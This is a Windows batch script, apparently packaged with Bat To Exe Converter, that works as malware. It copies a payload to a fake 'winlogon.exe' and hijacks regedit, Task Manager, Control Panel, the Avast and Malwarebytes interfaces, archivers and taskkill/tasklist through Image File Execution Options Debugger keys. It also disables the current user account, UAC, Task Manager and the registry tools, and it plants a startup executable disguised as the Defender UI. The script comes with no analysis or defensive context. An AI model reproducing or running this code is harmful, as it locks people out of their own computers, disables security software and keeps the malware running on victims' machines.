::[Bat To Exe Converter]
::
::fBE1pAF6MU+EWH3eyHYiJxFVQhfMFmSxA6YgwOf34+WQ4mYTXeU3bLPIw6eaJe1d713hFQ==
::fBE1pAF6MU+EWH3eyHYiJxFVQhfMFmSxA6YgwOf34+WQ4mYTXeU3bLPJ36eaMukQ/kzre4Vj02Jf+A==
::YAwzoRdxOk+EWAjk
::fBw5plQjdCuDJG2W+0gxJggaZguJOXiGLroQ5Ofsr8GJq0oVQN4Xd4PX1aPDC+4a7U3wO58u2Ro=
::YAwzuBVtJxjWCl3EqQJgSA==
::ZR4luwNxJguZRRnk
::Yhs/ulQjdF65
::cxAkpRVqdFKZSTk=
::cBs/ulQjdF65
::ZR41oxFsdFKZSTk=
::eBoioBt6dFKZSDk=
::cRo6pxp7LAbNWATEpSI=
::egkzugNsPRvcWATEpSI=
::dAsiuh18IRvcCxnZtBNQ
::cRYluBh/LU+EWAnk
::YxY4rhs+aU+IeA==
::cxY6rQJ7JhzQF1fEqQJhZk4aGlzMbTriVu18
::ZQ05rAF9IBncCkqN+0xwdVsFAlHMajP0V+REuLCb
::ZQ05rAF9IAHYFVzEqQIYJxdYQxPCF2WzAb0IiA==
::eg0/rx1wNQPfEVWB+kM9LVsJDCyNMGe1EZ4S4e/z+6SCukh9
::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
::cRolqwZ3JBvQF1fEqQIYJxdYQxPCF2WzAb0IqN/+7aq0p1kIRII=
::dhA7uBVwLU+EWG2B9U9wCxNRXhabXA==
::YQ03rBFzNR3SWATE3E08JBRDDC+MNWyyEtU=
::dhAmsQZ3MwfNWATEvEF5aC9RTQnCH2O/FKcFiA==
::ZQ0/vhVqMQ3MEVWAtB9wSA==
::Zg8zqx1/OA3MEVWAtB9wSA==
::dhA7pRFwIByZRRnk
::Zh4grVQjdCuDJG2W+0gxJggaZguJOXiGLroQ5Ofsr8GJq0oVQN4Xd4PX1aOlLukU4lGqcI4otg==
::YB416Ek+ZW8=
::
::
::978f952a14a936cc963da21a135fa983
@echo off
copy restrictions.exe C:\ProgramData\winlogon.exe
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\regedit.exe" /v "Debugger" /t REG_SZ /d C:\ProgramData\winlogon.exe /f
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskmgr.exe" /v "Debugger" /t REG_SZ /d C:\ProgramData\winlogon.exe /f
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\control.exe" /v "Debugger" /t REG_SZ /d C:\ProgramData\winlogon.exe /f
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\mmc.exe" /v "Debugger" /t REG_SZ /d C:\ProgramData\winlogon.exe /f
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\AvastUI.exe" /v "Debugger" /t REG_SZ /d C:\ProgramData\winlogon.exe /f
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\mbam.exe" /v "Debugger" /t REG_SZ /d C:\ProgramData\winlogon.exe /f
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\WinRAR.exe" /v "Debugger" /t REG_SZ /d C:\ProgramData\winlogon.exe /f
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\7zFM.exe" /v "Debugger" /t REG_SZ /d C:\ProgramData\winlogon.exe /f
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\MultiCommander.exe" /v "Debugger" /t REG_SZ /d C:\ProgramData\winlogon.exe /f
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskkill.exe" /v "Debugger" /t REG_SZ /d C:\ProgramData\winlogon.exe /f
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\tasklist.exe" /v "Debugger" /t REG_SZ /d C:\ProgramData\winlogon.exe /f
net user %username% /active:no
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableTaskMgr" /t REG_SZ /d 1 /f
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "EnableLUA" /t REG_DWORD /d 0 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableRegistryTools" /t REG_DWORD /d 1 /f
copy system.exe C:\ProgramData\Microsoft\Windows\Start" "Menu\Programs\StartUp\MSASCui.exe
exit